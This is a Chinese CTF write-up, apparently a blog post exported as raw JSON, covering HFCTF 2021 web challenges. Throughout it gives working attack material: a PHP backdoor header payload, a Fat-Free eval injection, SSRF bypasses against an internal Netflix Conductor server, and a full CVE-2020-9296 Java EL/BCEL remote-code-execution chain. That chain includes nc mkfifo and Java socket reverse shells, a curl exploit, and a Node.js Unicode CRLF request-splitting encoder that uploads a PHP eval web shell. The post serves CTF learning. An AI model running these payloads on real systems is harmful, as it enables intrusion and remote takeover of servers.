~","categories":[{"name":"SDL","slug":"SDL","permalink":"https://tari.moe/categories/SDL/"},{"name":"威胁建模","slug":"SDL/威胁建模","permalink":"https://tari.moe/categories/SDL/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/"}],"tags":[{"name":"SDL","slug":"SDL","permalink":"https://tari.moe/tags/SDL/"},{"name":"威胁建模","slug":"威胁建模","permalink":"https://tari.moe/tags/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/"}]},{"title":"2021HFCTF Web Writeup","slug":"2021/2021hfctf","date":"2021-04-03T09:47:20.000Z","updated":"2022-02-01T04:24:17.747Z","comments":true,"path":"/p/2021/2021hfctf/","link":"","permalink":"https://tari.moe/p/2021/2021hfctf/","excerpt":"","text":"internal_system 挺有意思的，复现完学到了刷多 （ 签到题考点：PHP供应链攻击 php 近期爆的漏洞，一开始就看到了， 喔？你说这个我可就不困了，（我是个爱看新闻的好孩子 逃 但是，，User-Agentt 看成了 User-Agent，，没成，然后被另一个地方吸住了眼球，在搞 guestbook.php 草。。 直到官方放出提示，我不信邪在看了一遍 1user-agentt: zerodiumsystem(&quot;cat /flag&quot;); unsetme考点：CVE-2020-5203 补丁绕过 源码 123456789101112131415&lt;?php// Kickstart the framework$f3=require(&#x27;lib/base.php&#x27;);// $f3 = Base::instance();$f3-&gt;set(&#x27;DEBUG&#x27;,1);if ((float)PCRE_VERSION&lt;8.0) trigger_error(&#x27;PCRE version is out of date&#x27;);// Load configurationhighlight_file(__FILE__);$a=$_GET[&#x27;a&#x27;];unset($f3-&gt;$a);$f3-&gt;run(); 也是有故事 开开心心本地分析了一波弄出来了，线上一打，啥返回都没= =，，我在想.. 你这不是考察 CVE-2020-5203 根据 3.7.2的代码修改记录 https://github.com/bcosca/fatfree-core/commit/dae95a0baf3963a9ef87c17cee52f78f77e21829 来写 3.7.1 的exp么？ 你不是。。3.7.2 吧？晕，于是想办法找，找到了 changlog 来确定版本 1lib/CHANGELOG.md 草，慢慢分析吧，其实漏洞触发点是类似的 由上两图，$f3 是 Base 实例，这个类重载了 __unset 魔术方法，然后这个 $key 参数是可控的 也就是说，调用 unset($f3-&gt;$a); 会触发该魔术方法，跟进 $this-&gt;offsetunset 方法，调用 $this-&gt;clear 方法 继续跟进， 刚刚说到，这个 $key 参数是可控的，也就是说，这个 eval 里的 $val 是可控的 问题是，3.7.2 版本打过补丁， $this-&gt;compile 方法和之前的不同，如果用 3.7.1 版本的exp 打，断点调试，会发现最终 $val 构造出来是类似于 &quot;[&#39;xxx;eval_code&#39;]&quot; ，无论怎样都会被包括在引号里的。 先传入 /?a=s 右边红框框住的部分和原本有点不一样，就是把写在一起的提取出来，赋值到变量里方便查看变化 经过 $this-&gt;compile 预处理值 $pre 为 $hive[&#39;s&#39;] ， 要后被 eval 的部分 $pinjie 为 &quot;unset($this-&gt;hive[&#39;s&#39;]);&quot; 。 到这里我们明白了大概的数据流，即设法构造 $_GET[&#39;a&#39;] 使我们的恶意代码可以被 eval 这里绕过有两个点 数组闭合 注释闭合多余部分 继续尝试构造传入 a=s[]); 可以看到 $pre 部分已经成功被闭合了，但是有个问题， $pinjie 部分拼接不正常 unset($this-&gt;hive[&#39;s&#39;][&#39;&#39;]); 这部分正常，但多了 ); 至于为什么我这么熟练，直接用数组给闭合了，，因为一开始，，在分析 3.7.1 时，把代码流，包括 $this-&gt;compile 部分给整明白了，然后 3.7.2 重构了 $this-&gt;compile 很类似，有兴趣可以去看看，就是正则有点多和复杂。。。看的头皮发麻 尝试传入 a=s[]);phpinfo();// 这样，反正后面多了的 ); 会被注释掉（好像和我新年出的 CTF 有点像，要闭合加注释），断点看看呗 然后线上环境 cat 一下就好了 “慢慢做” 管理系统没做出来，写思路，后续补上 提示 第一步登录的sql语句是”SELECT * FROM users WHERE password = ‘“.md5($password,true).”‘ limit 0,1”; 元老级 md5($password,true) 绕过，以前实验吧刷过，可以看以下链接 https://blog.csdn.net/March97/article/details/81222922 但是。。黑人问号.jpg 好，你说题目描述重要 这个sql吧，有点ssrf的样子，首页是一个很普通的sql注入，没有什么花样，但是我的admin.php是一个内网的管理系统，只要你用“真-admin”的密码登录了，就可以拿到flag，反正慢慢做就对了，不要急躁，静下心。 完全不知道 ssrf 的点在哪，一共就发现 index.php admin.php 和 flag.php 三个文件，好了，没思路了。（还是太菜了 emm，看来别人的wp，发现原来，，除了 ffifdyop 还有其他的，晕…. 坐等 buu 出复现 （ 5月6更 buu 群问了下，说不会出复现环境了，参考其他师傅的题解吧~ https://www.zhaoj.in/read-6885.html#WEB1 internal_system没做出来，但是感觉接近了 admin/admin 一把梭， 密码竟然是错的，不过有提示 访问 /source 获取源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149const express = require(&#x27;express&#x27;)const router = express.Router()const axios = require(&#x27;axios&#x27;)const isIp = require(&#x27;is-ip&#x27;)const IP = require(&#x27;ip&#x27;)const UrlParse = require(&#x27;url-parse&#x27;)const &#123;sha256, hint&#125; = require(&#x27;./utils&#x27;)const salt = &#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;const adminHash = sha256(sha256(salt + &#x27;admin&#x27;) + sha256(salt + &#x27;admin&#x27;))const port = process.env.PORT || 3000function formatResopnse(response) &#123; if(typeof(response) !== typeof(&#x27;&#x27;)) &#123; return JSON.stringify(response) &#125; else &#123; return response &#125;&#125;function SSRF_WAF(url) &#123; const host = new UrlParse(url).hostname.replace(/\\[|\\]/g, &#x27;&#x27;) return isIp(host) &amp;&amp; IP.isPublic(host)&#125;function FLAG_WAF(url) &#123; const pathname = new UrlParse(url).pathname return !pathname.startsWith(&#x27;/flag&#x27;)&#125;function OTHER_WAF(url) &#123; return true;&#125;const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF] router.get(&#x27;/&#x27;, (req, res, next) =&gt; &#123; if(req.session.admin === undefined || req.session.admin === null) &#123; res.redirect(&#x27;/login&#x27;) &#125; else &#123; res.redirect(&#x27;/index&#x27;) &#125;&#125;)router.get(&#x27;/login&#x27;, (req, res, next) =&gt; &#123; const &#123;username, password&#125; = req.query; if(!username || !password || username === password || username.length === password.length || username === &#x27;admin&#x27;) &#123; res.render(&#x27;login&#x27;) &#125; else &#123; const hash = sha256(sha256(salt + username) + sha256(salt + password)) req.session.admin = hash === adminHash res.redirect(&#x27;/index&#x27;) &#125;&#125;)router.get(&#x27;/index&#x27;, (req, res, next) =&gt; &#123; if(req.session.admin === undefined || req.session.admin === null) &#123; res.redirect(&#x27;/login&#x27;) &#125; else &#123; res.render(&#x27;index&#x27;, &#123;admin: req.session.admin&#125;) &#125;&#125;)router.get(&#x27;/proxy&#x27;, async(req, res, next) =&gt; &#123; if(!req.session.admin) &#123; return res.redirect(&#x27;/index&#x27;) &#125; const url = decodeURI(req.query.url); console.log(url) const status = WAF_LISTS.map((waf)=&gt;waf(url)).reduce((a,b)=&gt;a&amp;&amp;b) if(!status) &#123; res.render(&#x27;base&#x27;, &#123;title: &#x27;WAF&#x27;, content: &quot;Here is the waf...&quot;&#125;) &#125; else &#123; try &#123; const response = await axios.get(`http://127.0.0.1:$&#123;port&#125;/search?url=$&#123;url&#125;`) res.render(&#x27;base&#x27;, response.data) &#125; catch(error) &#123; res.render(&#x27;base&#x27;, error.message) &#125; &#125;&#125;) router.post(&#x27;/proxy&#x27;, async(req, res, next) =&gt; &#123; if(!req.session.admin) &#123; return res.redirect(&#x27;/index&#x27;) &#125; // test url // not implemented here const url = &quot;https://postman-echo.com/post&quot; await axios.post(`http://127.0.0.1:$&#123;port&#125;/search?url=$&#123;url&#125;`) res.render(&#x27;base&#x27;, &quot;Something needs to be implemented&quot;)&#125;)router.all(&#x27;/search&#x27;, async (req, res, next) =&gt; &#123; if(!/127\\.0\\.0\\.1/.test(req.ip))&#123; return res.send(&#123;title: &#x27;Error&#x27;, content: &#x27;You can only use proxy to aceess here!&#x27;&#125;) &#125; const result = &#123;title: &#x27;Search Success&#x27;, content: &#x27;&#x27;&#125; const method = req.method.toLowerCase() const url = decodeURI(req.query.url) const data = req.body try &#123; if(method == &#x27;get&#x27;) &#123; const response = await axios.get(url) result.content = formatResopnse(response.data) &#125; else if(method == &#x27;post&#x27;) &#123; const response = await axios.post(url, data) result.content = formatResopnse(response.data) &#125; else &#123; result.title = &#x27;Error&#x27; result.content = &#x27;Unsupported Method&#x27; &#125; &#125; catch(error) &#123; result.title = &#x27;Error&#x27; result.content = error.message &#125; return res.json(result)&#125;)router.get(&#x27;/source&#x27;, (req, res, next)=&gt;&#123; res.sendFile( __dirname + &quot;/&quot; + &quot;route.js&quot;);&#125;)router.get(&#x27;/flag&#x27;, (req, res, next) =&gt; &#123; if(!/127\\.0\\.0\\.1/.test(req.ip))&#123; return res.send(&#123;title: &#x27;Error&#x27;, content: &#x27;No Flag For You!&#x27;&#125;) &#125; return res.json(&#123;hint: hint&#125;)&#125;)module.exports = router 查看 login 方法，也就是要满足以下条件 1if(!username || !password || username === password || username.length === password.length || username === &#x27;admin&#x27;) 和 1req.session.admin = hash === adminHash 其中我们传入的为 1const hash = sha256(sha256(salt + username) + sha256(salt + password)) 然后见代码 13 和 15行 123const salt = &#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;const adminHash = sha256(sha256(salt + &#x27;admin&#x27;) + sha256(salt + &#x27;admin&#x27;)) 也就是说，用户名和密码都要是 admin 但是，，他们长度和内容不一样 = =，好，非常好，还好 js 有的特性和 PHP 有点类似，username 用数组即可绕过 登录成功后，我们要想办法访问 /flag 接口，不过必须为内网 ip 123456router.get(&#x27;/flag&#x27;, (req, res, next) =&gt; &#123; if(!/127\\.0\\.0\\.1/.test(req.ip))&#123; return res.send(&#123;title: &#x27;Error&#x27;, content: &#x27;No Flag For You!&#x27;&#125;) &#125; return res.json(&#123;hint: hint&#125;)&#125;) 代码里提供 /proxy 接口可以代理访问，然后这个接口是本机访问的，所以可以跳过这个限制 绕过点1 12345function SSRF_WAF(url) &#123; const host = new UrlParse(url).hostname.replace(/\\[|\\]/g, &#x27;&#x27;) return isIp(host) &amp;&amp; IP.isPublic(host)&#125; 你传入的要是ip，，不能是域名，而且，ip必须是公网ip，其实这个好办，整个公网服务器，然后 写入代码重定向即可 至于为啥在这里写 /flag 是因为内部代理请求不会触发这个waf 机制 绕过点2 1234function FLAG_WAF(url) &#123; const pathname = new UrlParse(url).pathname return !pathname.startsWith(&#x27;/flag&#x27;)&#125; 构造一下 即可得到提示， 大概意思是他们在内网部署了 netflix conductor 服务器，让我们 SSRF 一下，这里熟悉 docker 的 果果 同学跟我说题目都是 docker 搭建的，会不会，，这个 netflix 服务也是 docker 来的呢？ 膜拜.jpg ，至于为什么知道是 8080 端口，搜一下 netflix 官方部署文档，就 8080 和 5000 两个端口。 当然，这里还有小差曲，我一开始暴力破解，，内网ip 和 端口，直接把它给弄宕机了。。。 源码有点长，提取关键部分 1234567891011121314151617window.swaggerUi = new SwaggerUi(&#123; url: url + &quot;/api/swagger.json&quot;, dom_id: &quot;swagger-ui-container&quot;, supportedSubmitMethods: [&#x27;get&#x27;, &#x27;post&#x27;, &#x27;put&#x27;, &#x27;delete&#x27;, &#x27;patch&#x27;], onComplete: function(swaggerApi, swaggerUi)&#123; window.swaggerUi.api.setBasePath(&quot;/api&quot;); if(typeof initOAuth == &quot;function&quot;) &#123; initOAuth(&#123; clientId: &quot;your-client-id&quot;, clientSecret: &quot;your-client-secret-if-required&quot;, realm: &quot;your-realms&quot;, appName: &quot;your-app-name&quot;, scopeSeparator: &quot; &quot;, additionalQueryStringParams: &#123;&#125; &#125;); &#125; 访问这个 json 文件 然后到这就卡住了 网上搜了一下 CVE， https://xz.aliyun.com/t/7889 毕竟 SSRF 常见都是和 Redis 之类的的，一般都是公开漏洞，然后接口好像也可以正常访问 正打算看看能不能 CRLF 啥的，看看能不能发送 POST 请求过去利用 CVE，但突然就访问不了了，，， 不知道思路是不是跑偏了，然后被举办方给看到了 ，就直接卡了，然后就没啥时间了，也没来得及试其他的，坐等 wp，我很好奇.jpg 4月22日更 好了，原来思路没有跑偏，我们继续（刚肝完论文 不过在 buu 的复现环境里直接给出了netflix 的内网ip，不用我们猜docker网段然后爆破，我们直接fuzz下图3个网段 8080端口即可 最近刷了一些SSRF题，发现还可以用 0.0.0.0 的方式去绕过 IP 限制，访问 0.0.0.0 默认是解析到本机上的，然后恰好 nodejs 的 IP.isPublic(host) 函数会把他视为公网IP。 注意fuzz线程不能太高，不然服务容易崩，最终发现netflix在 10.0.219.14:8080 现在网上搜了一下，发现有多个的漏洞，所以先确认一下 netflix 的版本， 先请求一下根路径发现源码有中暴露的api路径 1/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.219.14:8080 请求一下会返回json格式内容 1/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.219.14:8080/api/swagger.json 复制json 格式化一下发现 admin config 就在第一处，， 请求一下 1/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.219.14:8080/api/admin/config 发现 netflix 版本为 2.26.0，网上查了下，只发现 2.25.3 版本的漏洞 看了一下 commit 记录，发现这个版本已经修了的 看了一下大佬的复现，发现思路是对了，CRLF POST 利用 netflix 的 CVE https://xz.aliyun.com/t/9423 https://www.zhaoj.in/read-6905.html 经过这次比赛，发现，有时候版本不对就先试试临近版本，看看能不能死马当活马医 （ 首先要复现 CVE-2020-9296，先保证在本地能正常利用。 CVE-2020-9296 复现漏洞分析先搭建一下环境，复现一下 回到上面的 https://xz.aliyun.com/t/7889 链接 Netflix Conductor uses Java Bean Validation (JSR 380) custom constraint validators. When building custom constraint violation error messages, different types of interpolation are supported, including Java EL expressions. If an attacker can inject arbitrary data in the error message template being passed to ConstraintValidatorContext.buildConstraintViolationWithTemplate() argument, they will be able to run arbitrary Java code. 本次漏洞成因在于自定义约束冲突时的错误信息支持了 Java EL 表达式。如果攻击者可以控制ConstraintValidatorContext.buildConstraintViolationWithTemplate() 函数的参数，那么可以通过注入 Java EL 表达式进行任意代码执行。 源码代码下载：https://codeload.github.com/Netflix/conductor/zip/refs/tags/v2.25.0 全局搜一下 buildConstraintViolationWithTemplate( 发现多处有用到，并且参数利用 String.format(0) 生成的格式化字符串，格式化过程中存在用户可控的变量 taskDef.getName() 至于怎么发现的 TaskTimeoutConstraint.java 文件存在可利用点，可能排查起来就需要些时间和耐心了，这里跟着来先。 下一步继续关注 TaskTimeoutConstraint.java 在哪被使用，定位到 common/src/main/java/com/netflix/conductor/common/metadata/tasks/TaskDef.java 文件，其实也有多处引用，。找漏洞利用点的大佬辛苦了~ 可以看到 TaskTimeoutConstraint 注解到了 TaskDef 类上，那么下一步进行看 TaskDef 类会在哪里被使用，继续搜索全局引用，可以看到 jersey/src/main/java/com/netflix/conductor/server/resources/MetadataResource.java 会把该类和路由 /api/metadata/taskdefs 绑定，即我们通过请求该路由，即可获得 TaskDef 对象。 https://netflix.github.io/conductor/labs/beginner/ 官方给出的访问 API 稍微修改后如下 123456789101112131415curl -X POST \\ http://localhost:8080/api/metadata/taskdefs \\ -H &#x27;Content-Type: application/json&#x27; \\ -d &#x27;[ &#123; &quot;name&quot;: &quot;verify_if_idents_are_added&quot;, &quot;retryCount&quot;: 3, &quot;retryLogic&quot;: &quot;FIXED&quot;, &quot;retryDelaySeconds&quot;: 10, &quot;timeoutSeconds&quot;: 180, &quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;, &quot;responseTimeoutSeconds&quot;: 300, &quot;ownerEmail&quot;: &quot;type your email here&quot; &#125;]&#x27; 所以漏洞最终的利用逻辑如下： 通过 POST 请求访问 URL /api/metadata/taskdefs 创建 TaskDef 对象 根据官方API给出的demo稍微修改后，参数中的 timeoutSeconds 和 responseTimeoutSeconds 满足了 taskDef.getTimeoutSeconds() &gt; 0 以及 taskDef.getResponseTimeoutSeconds() &gt; taskDef.getTimeoutSeconds() 这两个条件，TaskTimeoutValidator 校验失败，TaskDef 的 name 属性作为错误信息的一部分通过 buildConstraintViolationWithTemplate(0) 输出 由于 name 是我们构造好的 Java EL 表达式，所以最后该表达式会被执行，进而成功触发远程代码执行 漏洞利用还自带 docker-compose.yaml 也太贴心了吧 （ 由于刚刚下载的就是2.25.0版本，所以直接切到 docker 目录，在 up 一下就好 12cd dockerdocker-compose up -d 如果期间有下载错误啥的，可以尝试代理或者 up 多几下。 注意事项无论下面是自己写 BCEL 还是 直接用现有的工具，都要注意 Java的版本，我本地用的是 1.8.0_144 版本。 这里还篇有趣的文章，BCEL ClassLoader去哪了 ，我感觉和这个有关，2333 据网上看，好像保证 Java 版本 &lt; Java 8u261 即可。 自己写一个，熟悉一下BCEL依赖下载地址： https://jar-download.com/artifacts/org.apache.servicemix.bundles/org.apache.servicemix.bundles.jaxp-ri/1.4.5_1/ Main.java 123456789101112import com.sun.org.apache.bcel.internal.Repository;import com.sun.org.apache.bcel.internal.classfile.Utility;import com.sun.org.apache.bcel.internal.classfile.JavaClass;public class Main &#123; public static void main(String[] args) throws Exception &#123; JavaClass cls = Repository.lookupClass(Exp.class); String code = Utility.encode(cls.getBytes(), true); System.out.println(&quot;$$BCEL$$&quot; + code); &#125;&#125; Exp.java 12345678910public class Exp &#123; public static void main(String[] args) &#123; &#125; public Exp() throws Exception&#123; Runtime.getRuntime().exec(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;监听IP&gt; &lt;监听端口&gt; &gt;/tmp/f&quot;); &#125;&#125; 这个POC我在本机可以打成功，但是通过 curl 打实际docker环境 shell 就反弹不回来，然后也试了各种方法 sh 反弹方法，毕竟是 docker最简环境嘛，一般里面除了 sh 能用其他基本没啥了。 然后突然想起之前看到这篇酒仙桥的文章，他遇到的情形和我一样。然后通过 java 编写 socket 的思路来反弹shell，这样可以不依赖于具体的系统环境。 真 Exp.java 12345678910111213141516171819202122232425262728293031323334import java.net.Socket;import java.io.InputStream;import java.io.OutputStream;public class Exp &#123; public Exp() throws Exception &#123; String host=&quot;&quot;; // // nc监听IP int port=; // nc监听端口，注意是整型不是字符串 String cmd=&quot;/bin/sh&quot;; // 如果是 windows 就换成 cmd.exe Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); Socket s=new Socket(host,port); InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed())&#123; while(pi.available()&gt;0) so.write(pi.read()); while(pe.available()&gt;0) so.write(pe.read()); while(si.available()&gt;0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try &#123; p.exitValue(); break; &#125;catch (Exception e)&#123; &#125; &#125;; p.destroy(); s.close(); &#125;&#125; 当然可以不反弹shell，可以通过 wget 之类的方式下载到本地在加载， 不过就是想复现一下，万一以后遇到了 HTTP 不出网呢 （ 结构如下 BCEL编码后的恶意代码 直接用现有工具https://github.com/f1tz/BCELCodeman 也是先写好 exp，然后 1javac Exp.java -d /tmp/Exp.class BCEL编码后的恶意代码 1java -jar BCELCodeman.jar e /tmp/Exp.class 构造POC得到编码后构造 POC ，主要是替换 name 部分为 EL表达式，内容为 com.sun.org.apache.bcel.internal.util.ClassLoader 加载器加载BCEL编码后的恶意代码 12345678910111213141516curl -X POST \\ http://localhost:8080/api/metadata/taskdefs \\ -H &#x27;Content-Type: application/json&#x27; \\ -d &#x27;[ &#123; &quot;name&quot;: &quot;$&#123;&#x27;\\&#x27;&#x27; &#x27;\\&#x27;&#x27;.getClass().forName(&#x27;\\&#x27;&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;\\&#x27;&#x27;).newInstance().loadClass(&#x27;\\&#x27;&#x27;&lt;刚刚生成的BCEL编码&gt;&#x27;\\&#x27;&#x27;).newInstance().class&#125;&quot;, &quot;ownerEmail&quot;: &quot;test@example.org&quot;, &quot;retryCount&quot;: 3, &quot;retryLogic&quot;: &quot;FIXED&quot;, &quot;retryDelaySeconds&quot;: 10, &quot;timeoutSeconds&quot;: 180, &quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;, &quot;responseTimeoutSeconds&quot;: 300, &quot;ownerEmail&quot;: &quot;type your email here&quot; &#125;]&#x27; 成功反弹shell 根据漏洞相关的 pull requests：https://github.com/Netflix/conductor/pull/1543 可以定位对该漏洞的修复 开发者将 org.hibernate:hibernate-validator 替换为了 org.apache.bval:bval-jsr，而后者在最新版本下不会解析 Java EL 表达式，所以也不会有 RCE 的危险。 好，本地复现成功，把这个 POC 直接打线上，估计问题不大 回到题目中现在漏洞是可以尝试去利用了，问题是，题目只提供 GET 的代理，无法发送 POST 请求。 继续沿着一开始的思路走，CRLF SSRF guguru了一下，nodejs CRLF 漏洞，发现还真有2333 这篇写的比较详细，跟着复现一下 https://mp.weixin.qq.com/s/X6dq1WsKcEjNVwSJKiBMvA 然后看了别人的复现，发现有一个比较隐秘的提示。。 1const salt = &#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27; 中间藏了个 8，， nodejs8 is best，2333 不过不伤大雅，眼睛不好网上搜一下也可以知道 nodejs HTTP库包含了阻止CRLF的措施，普通 CRLF不管用，但可以通过 nodejs 的设计不严谨问题来绕过。当然这个问题在 nodejs10 被修复了，如果请求路径包含非Ascii字符，则会抛出错误。 nodejs &lt; 9版本 CRLF注入对于 Node.js v8 或更低版本，如果有下列情况，任何发出HTTP请求的服务器都可能受到通过请求拆实现的SSRF的攻击： 接受来自用户输入的Unicode数据 并将其包含在HTTP请求的路径中 且请求具有一个0长度的主体（比如一个 GET 或者 DELETE） 由于本机是 node10+，所以docker拉个镜像， 1docker pull node:8.8.0-alpine 进入容器的node环境，然后试试普通的 CRLF 1234/ # node&gt; var http = require(&quot;http&quot;);&gt; http.get(&#x27;http://192.168.123.37:2233/\\r\\nwhoami&#x27;).output[ &#x27;GET /%0D%0Awhoami HTTP/1.1\\r\\nHost: 192.168.123.37:2233\\r\\nConnection: close\\r\\n\\r\\n&#x27; ] 返回包 1234&gt; nc -lv 0.0.0.0 2233GET /%0D%0Awhoami HTTP/1.1Host: 192.168.123.37:2233Connection: close nodejs Unicode 字符损失原理 当 Node.js v8 或更低版本对URL发出的 GET 请求进行处理时，它不会进行编码转义，因为它们不是HTTP控制字符，但HTTP请求返回的结果中会被编码为 latin1 编码写入路径，但 latin1 编码为单字节编码（编码范围为 0x00 - 0xFF ，其中 0x00 - 0x7F之间完全和ASCII一致，0x80 - 0x9F之间是控制字符，0xA0 - 0xFF之间是文字符号 ），如果此时我们用单字节 8位 Unicode 编码，那么高 4 位会被截断。 构造请求 12&gt; http.get(&#x27;http://192.168.123.37:2233/\\u&#123;220D&#125;\\u&#123;330A&#125;tari&#x27;).output[ &#x27;GET /∍㌊tari HTTP/1.1\\r\\nHost: 192.168.123.37:2233\\r\\nConnection: close\\r\\n\\r\\n&#x27; ] 返回包 12345&gt; nc -lv 0.0.0.0 2233GET /tari HTTP/1.1Host: 192.168.123.37:2233Connection: close 观察 \\u&#123;220D&#125; 和 \\u&#123;330A&#125; ，其中 22 和 33 随意，什么都行，因为最终高 4 位都会被截断，然后 0D 和 0A 分别为 \\r 和 \\n 的 ASCII码，然后Latin1是向下兼容ASCII码的，所以返回包被 \\r\\n 截断了， tari 变在第二行 可见，可以通过构造 Unicode字符，在 nodejs 实现 CRLF注入。 在实际使用时，因为 CRLF + SSRF 点 在 HTTP 状态行，所以要注意闭合原有的状态行中的 HTTP/1.1，即保证注入后有正常的 HTTP 状态行， 先举个例子，假设目标主机存在SSRF，需要我们在目标主机本地上传文件。我们需要尝试构造如下这个文件上传的完整 POST 请求： 12345678910111213141516171819202122232425POST /upload.php HTTP/1.1Host: 127.0.0.1Content-Length: 437Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4Connection: close------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;100000------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;Content-Type: application/octet-stream&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;Upload&quot;Upload------WebKitFormBoundaryjDb9HMGTixAA7Am6-- 为了方便，我们将这个POST请求里面的所有的字符包括控制符全部用上述的高编号Unicode码表示： 1234567891011121314151617181920212223242526272829303132333435363738394041payload = &#x27;&#x27;&#x27; HTTP/1.1POST /upload.php HTTP/1.1Host: 127.0.0.1Content-Length: 437Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4Connection: close------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;100000------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;Content-Type: application/octet-stream&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;Upload&quot;Upload------WebKitFormBoundaryjDb9HMGTixAA7Am6--GET / HTTP/1.1test:&#x27;&#x27;&#x27;.replace(&quot;\\n&quot;,&quot;\\r\\n&quot;)def payload_encode(raw): ret = u&quot;&quot; for i in raw: ret += chr(0x0100+ord(i)) return retpayload = payload_encode(payload)print(payload)# 输出: ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭč